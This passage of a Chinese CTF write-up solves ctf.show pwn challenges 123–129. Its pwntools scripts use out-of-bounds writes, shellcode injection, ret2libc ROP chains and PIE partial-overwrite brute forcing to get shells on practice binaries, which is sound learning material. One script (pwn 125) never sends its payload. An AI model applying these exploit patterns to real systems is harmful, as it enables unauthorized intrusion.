++i )</span><br><span class="line">        v2 += v3[i + <span class="number">1</span>];</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;Sum is %d\n&quot;</span>, v2);</span><br><span class="line">      result = sub_8048990();</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">      <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">9</span>; ++i )</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;arr[%d] is %d\n&quot;</span>, i, v3[i + <span class="number">1</span>]);</span><br><span class="line">      <span class="keyword">goto</span> LABEL_14;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">LABEL_14:</span><br><span class="line">      result = sub_8048990();</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到对数组进行了初始化，但是后面并没有对数组边界进行检查，可以直接修改返回地址</p>
<p>数组起始位置在0x34位置，对应返回地址位置位 (0x34+4)&#x2F;4 &#x3D; 14</p>
<p>存在后门函数init0()：</p>
<p><img src="https://cv2bkr5mufd.feishu.cn/space/api/box/stream/download/asynccode/?code=OTRkMjZhOTBjNTI2NmM2NDU3YzQ1MGIxZDEwZTFmMGRfbU1wZkJIdXlpZjVaQVM1OElYSUZmQXNFQWlLSFFmTnJfVG9rZW46WDE5eGJpMzhRb1FTeXN4ajFWY2NPa1ZXbmViXzE3NDAyMjk1NTY6MTc0MDIzMzE1Nl9WNA" alt="img"></p>
<p>所以我们只需要将arr[14]修改成后门函数地址即可get shell</p>
<p>exp</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;i386&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment">#io = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;pwn.challenge.ctf.show&#x27;</span>,<span class="number">28105</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">init0 = elf.sym[<span class="string">&#x27;init0&#x27;</span>]</span><br><span class="line">io.recvuntil(<span class="string">&quot;what&#x27;s your name?&quot;</span>)</span><br><span class="line">io.sendline(<span class="string">&quot;bit&quot;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;4 &gt; dump all numbers&quot;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot; &gt; &quot;</span>)</span><br><span class="line">io.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;Index to edit: &quot;</span>)</span><br><span class="line">io.sendline(<span class="string">&quot;14&quot;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;How many? &quot;</span>)</span><br><span class="line">io.sendline(<span class="built_in">str</span>(init0))</span><br><span class="line">io.sendline(<span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">io.recv()</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<h1 id="NX-Bypass"><a href="#NX-Bypass" class="headerlink" title="NX Bypass"></a>NX Bypass</h1><h2 id="pwn-124"><a href="#pwn-124" class="headerlink" title="pwn 124"></a>pwn 124</h2><p>检查保护：</p>
<p><img src="https://sanbox-1332327456.cos.ap-guangzhou.myqcloud.com/pic/202502251925352.png"></p>
<p>32位仅部分开启RELRO保护</p>
<p>IDA查看main函数：</p>
<p><img src="https://sanbox-1332327456.cos.ap-guangzhou.myqcloud.com/pic/202502251924773.png"></p>
<p>先输入一个字符串，然后进入判断，如果输入的是”CTFshowPWN”就进入ctfshow函数，跟进ctfshow函数：</p>
<p><img src="https://sanbox-1332327456.cos.ap-guangzhou.myqcloud.com/pic/202502251926757.png"></p>
<p>进入ctfshow函数后这里我们可以看到这段汇编代码的一个基本逻辑就是read读取一些数据然后执行这段数据，因此这里我们直接将shellcode注入即可</p>
<p>exp</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>,arch=<span class="string">&#x27;i386&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>) //在使用shellcode.sh()时最好加上这段</span><br><span class="line"><span class="comment">#p = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;pwn.challenge.ctf.show&#x27;</span>, <span class="number">28301</span>)</span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line">payload = shellcode </span><br><span class="line">p.sendline(<span class="string">&quot;CTFshowPWN&quot;</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="pwn-125"><a href="#pwn-125" class="headerlink" title="pwn 125"></a>pwn 125</h2><p>检查保护：</p>
<p><img src="https://sanbox-1332327456.cos.ap-guangzhou.myqcloud.com/pic/202502251939352.png"></p>
<p>64位开启NX，部分开启RELRO</p>
<p>IDA查看main函数：</p>
<p><img src="https://sanbox-1332327456.cos.ap-guangzhou.myqcloud.com/pic/202502251939521.png"></p>
<p>跟进ctfshow函数：</p>
<p><img src="https://sanbox-1332327456.cos.ap-guangzhou.myqcloud.com/pic/202502251940131.png"></p>
<p>很明显存在缓冲区溢出漏洞，常规做法一般会如何去做？由于开启了NX，一般会考虑使用ROP去绕过NX，继续查看发现程序中有system函数地址，找到ez函数：</p>
<p><img src="https://sanbox-1332327456.cos.ap-guangzhou.myqcloud.com/pic/202502251940931.png"></p>
<p>常规做法这里不再概述，相信大家在前面练了这么多应该都会了，我们仔细查看汇编代码（看伪代码看不出来的地方）：</p>
<p><img src="https://sanbox-1332327456.cos.ap-guangzhou.myqcloud.com/pic/202502251941508.png"></p>
<p>发现这里多出了mov rdi,rsp,这不就是将 rdi 指向了scanf读入的数据在内存中的第一个位置？利用这一点可以很简单写入”&#x2F;bin&#x2F;sh\x00”</p>
<p>那么现在我们有了溢出漏洞，有了system，有了”&#x2F;bin&#x2F;sh“，就非常简单了</p>
<p>exp</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;pwn.challenge.ctf.show&#x27;</span>,<span class="number">28290</span>)</span><br><span class="line">call_system = <span class="number">0x400672</span></span><br><span class="line"></span><br><span class="line">call_system = <span class="number">0x400672</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;/bin/sh\x00&#x27;</span> + <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x2000</span> + p64(call_system)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="pwn-126"><a href="#pwn-126" class="headerlink" title="pwn 126"></a>pwn 126</h2><p>检查保护：</p>
<p><img src="https://sanbox-1332327456.cos.ap-guangzhou.myqcloud.com/pic/202502252024468.png"></p>
<p>64位开启NX，部分开启RELRO</p>
<p>IDA查看main函数：</p>
<p><img src="https://sanbox-1332327456.cos.ap-guangzhou.myqcloud.com/pic/202502252024676.png"></p>
<p>跟进ctfshow()：</p>
<p><img src="C:\Users\LEGION\AppData\Roaming\Typora\typora-user-images\image-20250225202501210.png" alt="image-20250225202501210"></p>
<p>明显的栈溢出漏洞了，那么我们常规做法，也就是前面学习的过程中我们可以使用ret2libc轻松绕过</p>
<p>依据题目描述，我们可知远程环境的ALSR保护为2，我们先在本地改为0,可以发现，我们无需去进行泄漏地址，直接在gdb调试（详细调试过程直播中会进行讲解）找到对应地址即可进行攻击。</p>
<p>exp</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment">#io = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;pwn.challenge.ctf.show&#x27;</span>,<span class="number">28198</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line"><span class="comment">###   ALSR = 0 ####</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">ret = 0x80483ba # 0x080483ba : ret </span></span><br><span class="line"><span class="string">system = 0x7ffff7a31420</span></span><br><span class="line"><span class="string">binsh = 0x7ffff7b95d88</span></span><br><span class="line"><span class="string">pop_rdi = 0x4007a3  # 0x00000000004007a3 : pop rdi ; ret</span></span><br><span class="line"><span class="string">ret = 0x4004c6  # 0x00000000004004c6 : ret </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">payload = cyclic(0x40+8) + p64(pop_rdi) + p64(binsh) + p64(ret) + p64(system)</span></span><br><span class="line"><span class="string">io.send(payload)</span></span><br><span class="line"><span class="string">io.recv()</span></span><br><span class="line"><span class="string">io.interactive()</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="comment">### ret2libc ###</span></span><br><span class="line">main = elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">pop_rdi = <span class="number">0x4007a3</span> <span class="comment"># 0x00000000004007a3 : pop rdi ; ret</span></span><br><span class="line">ret = <span class="number">0x4004c6</span>     <span class="comment"># 0x00000000004004c6 : ret</span></span><br><span class="line"></span><br><span class="line">payload = cyclic(<span class="number">0x40</span>+<span class="number">8</span>) + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main)</span><br><span class="line">io.recvuntil(<span class="string">&quot;Let&#x27;s go\n&quot;</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">puts = u64(io.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(puts)</span><br><span class="line">libc_base = puts - libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">system = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">bin_sh = libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line">payload = cyclic(<span class="number">0x40</span>+<span class="number">8</span>) + p64(pop_rdi) + p64(bin_sh) + p64(ret) + p64(system)</span><br><span class="line">io.recvuntil(<span class="string">&quot;Let&#x27;s go\n&quot;</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="pwn-127"><a href="#pwn-127" class="headerlink" title="pwn 127"></a>pwn 127</h2><p>检查保护：</p>
<p><img src="https://sanbox-1332327456.cos.ap-guangzhou.myqcloud.com/pic/202502252044957.png"></p>
<p>64位开启NX，部分开启RELRO</p>
<p>IDA查看main函数：</p>
<p><img src="https://sanbox-1332327456.cos.ap-guangzhou.myqcloud.com/pic/202502252045099.png"></p>
<p>跟进ctfshow():</p>
<p><img src="https://sanbox-1332327456.cos.ap-guangzhou.myqcloud.com/pic/202502252045551.png"></p>
<p>同样的原理，未开启PIE时，仍然可以用ret2libc的方法,这里可以当作对前面题目的复习</p>
<p>exp</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># context(log_level=&#x27;debug&#x27;,arch=&#x27;i386&#x27;, os=&#x27;linux&#x27;)</span></span><br><span class="line"><span class="comment"># context(log_level=&#x27;debug&#x27;,arch=&#x27;amd64&#x27;, os=&#x27;linux&#x27;)</span></span><br><span class="line"></span><br><span class="line">pwnfile = <span class="string">&quot;../code/pwn&quot;</span></span><br><span class="line">p = remote(<span class="string">&quot;pwn.challenge.ctf.show&quot;</span>, <span class="number">28218</span>)</span><br><span class="line"><span class="comment"># p = process(pwnfile)</span></span><br><span class="line">elf = ELF(pwnfile)</span><br><span class="line"><span class="comment"># libc = ELF(&quot;./libc-2.23.so&quot;)</span></span><br><span class="line"></span><br><span class="line">s       = <span class="keyword">lambda</span> data               :p.send(data)</span><br><span class="line">sa      = <span class="keyword">lambda</span> delim,data         :p.sendafter(delim, data)</span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :p.sendline(data)</span><br><span class="line">sla     = <span class="keyword">lambda</span> delim,data         :p.sendlineafter(delim, data)</span><br><span class="line">ru      = <span class="keyword">lambda</span> delims		        :p.recvuntil(delims)</span><br><span class="line">itr     = <span class="keyword">lambda</span>                    :p.interactive()</span><br><span class="line">uu32    = <span class="keyword">lambda</span> data               :u32(data.ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span> data               :u64(data.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">leak    = <span class="keyword">lambda</span> name,addr          :log.success(<span class="string">&#x27;&#123;&#125; = &#123;:#x&#125;&#x27;</span>.<span class="built_in">format</span>(name, addr))</span><br><span class="line">lg      = <span class="keyword">lambda</span> address,data       :log.success(<span class="string">&#x27;%s: &#x27;</span>%(address)+<span class="built_in">hex</span>(data))</span><br><span class="line"></span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">ctfshow = elf.sym[<span class="string">&#x27;ctfshow&#x27;</span>]</span><br><span class="line"></span><br><span class="line">pop_rdi = <span class="number">0x400803</span></span><br><span class="line">ret = <span class="number">0x4004fe</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * (<span class="number">0x80</span> + <span class="number">8</span>) + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(ctfshow)</span><br><span class="line">sl(payload)</span><br><span class="line"></span><br><span class="line">puts_addr = u64(ru(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">log.success(<span class="string">f&#x27;puts_addr -- &gt; &#x27;</span> + <span class="built_in">hex</span>(puts_addr))</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;puts&#x27;</span>, puts_addr)</span><br><span class="line"></span><br><span class="line">libcbase = puts_addr - libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">sys_addr = libcbase + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">binsh_addr = libcbase + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">b&#x27;a&#x27;</span> * (<span class="number">0x80</span> + <span class="number">8</span>) + p64(pop_rdi) + p64(binsh_addr) + p64(ret) + p64(sys_addr)</span><br><span class="line"></span><br><span class="line">sl(payload2)</span><br><span class="line"></span><br><span class="line">itr()</span><br></pre></td></tr></table></figure>

<h2 id="pwn-128"><a href="#pwn-128" class="headerlink" title="pwn 128"></a>pwn 128</h2><p>检查保护：</p>
<p><img src="https://sanbox-1332327456.cos.ap-guangzhou.myqcloud.com/pic/202502252100746.png"></p>
<p>64位开启NX，开启了PIE，部分开启RELRO</p>
<p>IDA查看main函数，跟进dopwn()：</p>
<p><img src="https://sanbox-1332327456.cos.ap-guangzhou.myqcloud.com/pic/202502252100977.png"></p>
<p>分别跟进set_user():</p>
<p><img src="https://sanbox-1332327456.cos.ap-guangzhou.myqcloud.com/pic/202502252101417.png"></p>
<p>set_pwn():</p>
<p><img src="https://sanbox-1332327456.cos.ap-guangzhou.myqcloud.com/pic/202502252101264.png"></p>
<p>可以读取128字符的username，从set_pwn中对strncpy的调用可以看出长度保存在a1+180，username首地址在a1+140，可以通过溢出修改strncpy长度造成溢出。</p>
<blockquote>
<p><strong>注：这里之所以没有输入函数还可以输入数据，是因为这里其实bss段的起始地址与stdin重叠了，因此这里fgets的第三个参数_bss_start其实可以看成是stdin</strong></p>
<p><img src="https://sanbox-1332327456.cos.ap-guangzhou.myqcloud.com/pic/202502261836434.png"></p>
</blockquote>
<p>仔细查看发现存在后门函数GAME_OVER()：</p>
<p><img src="https://sanbox-1332327456.cos.ap-guangzhou.myqcloud.com/pic/202502252104943.png"></p>
<p>这个程序开启了PIE保护，我们不能确定后门函数GAME_OVER()的具体地址，因此没办法直接通过溢出来跳转到后门函数GAME_OVER()。我们可以尝试爆破。</p>
<p>由于内存的页载入机制，PIE的随机化只能影响到单个内存页。通常来说，一个内存页大小为0x1000，这就意味着不管地址怎么变，某条指令的后12位，3个十六进制数的地址是始终不变的。因此通过覆盖EIP的后8或16位 (按字节写入，每字节8位)就可以快速爆破或者直接劫持EIP。</p>
<p>查看汇编代码：</p>
<p><img src="https://sanbox-1332327456.cos.ap-guangzhou.myqcloud.com/pic/202502252119183.png"></p>
<p>我们可以看到其地址后三位为0x900</p>
<p>但是由于我们的payload必须按字节写入，每个字节是两个十六进制数，所以我们必须输入两个字节。除去已知的0x900还需要爆破一个十六进制数。这个数只可能在0~0xf之间改变，因此爆破并空间不大。</p>
<p>我们知道爆破失败的话程序就会崩溃，此时io的连接会关闭，因此调用io.recv( )会触发一个EOFError。由于这个特性，我们可以使用python的try…except…来捕获这个错误并进行处理。</p>
<blockquote>
<p>值得注意的是，由于没有刷新缓冲区，导致远程部署环境时回显信息会有差异，即没有及时显示，先让你输入，在两次输入过后才进行回显。但是我们可以先对本地进行尝试，在确定无误后再对远程进行修改</p>
</blockquote>
<p>远程exp：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;../code/pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#程序每次加载基地址都不同，因此这里我们只需要一直循环一个偏移地址直到基地址变到我们输入的地址</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>: </span><br><span class="line">	p = remote(<span class="string">&quot;pwn.challenge.ctf.show&quot;</span>, <span class="number">28137</span>)</span><br><span class="line">	payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">40</span> + <span class="string">b&#x27;\xca&#x27;</span> <span class="comment"># 设置set_pwn里输入长度为\xca，这样正好可以截断输入数据中的&#x27;\n&#x27;</span></span><br><span class="line">	p.sendline(payload)</span><br><span class="line">	</span><br><span class="line">	payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">200</span></span><br><span class="line">	payload += <span class="string">b&#x27;\x01\x09&#x27;</span> <span class="comment"># GAME_OVER函数的偏移地址为0x900，因为程序是小端序，所以写成&#x27;\x01\x09&#x27;，&#x27;\x09&#x27;这里其实也可以替换成&#x27;\x19&#x27;....，这里只是只有低三位的9是确定的，第四位是需要爆破的0x0~0xf之间都可</span></span><br><span class="line">	p.sendline(payload)</span><br><span class="line">	<span class="keyword">try</span>:</span><br><span class="line">		p.recv(timeout=<span class="number">1</span>)</span><br><span class="line">	<span class="keyword">except</span> EOFError:</span><br><span class="line">		p.close()</span><br><span class="line">		<span class="keyword">continue</span></span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		sleep(<span class="number">0.1</span>)</span><br><span class="line">		p.sendline(<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">		sleep(<span class="number">0.1</span>)</span><br><span class="line">		p.interactive()</span><br><span class="line">		<span class="keyword">break</span></span><br></pre></td></tr></table></figure>

<h1 id="pwn-129"><a href="#pwn-129" class="headerlink" title="pwn 129"></a>pwn 129</h1><p>检查保护：</p>
<p><img src="https://cv2bkr5mufd.feishu.cn/space/api/box/stream/download/asynccode/?code=MTg1ZTc4ZmY5NzA4MGQ5MDU1NDFjZDBjODRjOTE1OWNfVDhsMW56YUxJb1k5UGJLZENuam1ySG96ZlkwbkE3b2hfVG9rZW46RHExNWJ2bzhob3lYV3l4b0pNWWNXcTNobkpQXzE3NDAyMjk1NTY6MTc0MDIzMzE1Nl9WNA" alt="img"></p>
<p>64位开启NX，开启了PIE，部分开启RELRO</p>
<p>IDA查看main函数：</p>
<p><img src="https://cv2bkr5mufd.feishu.cn/space/api/box/stream/download/asynccode/?code=ZDg1Y2Q2ZjcwZDk3MDNmMzM2ZDlhMmY3ZDUyMjQ2NGFfcHBqS1NPcEZvZG9MY2J3OUlic1pNUjVwaDQxWG9VWkFfVG9rZW46TVJaVmJYNGhrbzF6MEJ4Um5aRWNOeG1VbjNiXzE3NDAyMjk1NTY6MTc0MDIzMzE1Nl9WNA" alt="img"></p>
<p>sub_DDC进行数值初始化（init），sub_B69进行打印logo(logo)。</p>
<p>接下来进入一个while循环中，紧接着进入另一个while循环，调用sub_DA5函数打印菜单：</p>
<p><img src="https://cv2bkr5mufd.feishu.cn/space/api/box/stream/download/asynccode/?code=NDQ2ZTRmMDQ1OWI3YmUwNjJmODVjZTMxMzY3NzYwZTVfell6RGdsUGQyYjh2Tm52SDNvOHFPSGNqN1VxdVdXWGNfVG9rZW46Q29wR2JzZUVCb3FJeUh4ZFJpd2M2ZDJvbnhlXzE3NDAyMjk1NTY6MTc0MDIzMzE1Nl9WNA" alt="img"></p>
<p>然后调用sub_DB00函数，读入一个字符，若此字符小于等于0则返回-1，否则，将字符用strtol函数强转为十进制数据，然后返回。返回值赋值给main函数的局部变量v3。若v3不为2则结束当前while循环，否则，调用sub_D06函数：</p>
<p><img src="https://cv2bkr5mufd.feishu.cn/space/api/box/stream/download/asynccode/?code=NmRjOWU0NWI1YjU4NDFmN2E0NmJiYmEyMzAwYmVjYzNfUUF1OThnTnZqSGtudmJtMEtPNjhzZkpRWEM4aXR0VDFfVG9rZW46SU5sS2JJTmREbzdZS054cXRjMmN0eFdMbkZkXzE3NDAyMjk1NTY6MTc0MDIzMzE1Nl9WNA" alt="img"></p>
<p><img src="https://cv2bkr5mufd.feishu.cn/space/api/box/stream/download/asynccode/?code=NzE2ZWYzMTk4ZGQ4NmYzM2I2YzJiMGVkZGQxNGRhNDJfWjlSbWpoSzRsa1Bva3Y5MzlBTHlEYnNnSldGajlIdUVfVG9rZW46UEFiRGJnMW84b3lScFF4YjNZVmN2SGpGbkhnXzE3NDAyMjk1NTY6MTc0MDIzMzE1Nl9WNA" alt="img"></p>
<p>会输出system函数的地址。 接下来就是第二层while循环下面的语句： 若刚刚读入数字v3不为3则结束循环，若v3不为1则打印字符串并继续最外层的while循环。 若v3为1，则进入sub_B94函数：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">int sub_B94()</span><br><span class="line">&#123;</span><br><span class="line">  __int64 v1; // [rsp+0h] [rbp-120h]</span><br><span class="line">  int v2; // [rsp+8h] [rbp-118h]</span><br><span class="line">  int v3; // [rsp+Ch] [rbp-114h]</span><br><span class="line">  __int64 v4; // [rsp+10h] [rbp-110h]</span><br><span class="line">  __int64 v5; // [rsp+10h] [rbp-110h]</span><br><span class="line">  __int64 v6; // [rsp+18h] [rbp-108h]</span><br><span class="line">  char v7[256]; // [rsp+20h] [rbp-100h] BYREF</span><br><span class="line"></span><br><span class="line">  puts(&quot;How many doubts?&quot;);</span><br><span class="line">  v1 = sub_B00();</span><br><span class="line">  if ( v1 &gt; 0 )</span><br><span class="line">    v4 = v1;</span><br><span class="line">  else</span><br><span class="line">    puts(&quot;Loser.&quot;);</span><br><span class="line">  puts(&quot;Any more?&quot;);</span><br><span class="line">  v5 = v4 + sub_B00();</span><br><span class="line">  if ( v5 &gt; 0 )</span><br><span class="line">  &#123;</span><br><span class="line">    if ( v5 &lt;= 99 )</span><br><span class="line">    &#123;</span><br><span class="line">      v6 = v5;</span><br><span class="line">    &#125;</span><br><span class="line">    else</span><br><span class="line">    &#123;</span><br><span class="line">      puts(&quot;You are being a real man.&quot;);</span><br><span class="line">      v6 = 100LL;</span><br><span class="line">    &#125;</span><br><span class="line">    puts(&quot;Let&#x27;s go! &quot;);</span><br><span class="line">    v2 = time(0LL);</span><br><span class="line">    if ( sub_E43(v6) )</span><br><span class="line">    &#123;</span><br><span class="line">      v3 = time(0LL);</span><br><span class="line">      sprintf(v7, &quot;Great job! You finished %d question  %d seconds\n&quot;, v6, (unsigned int)(v3 - v2));</span><br><span class="line">      puts(v7);</span><br><span class="line">    &#125;</span><br><span class="line">    else</span><br><span class="line">    &#123;</span><br><span class="line">      puts(&quot;You failed.&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    exit(0);</span><br><span 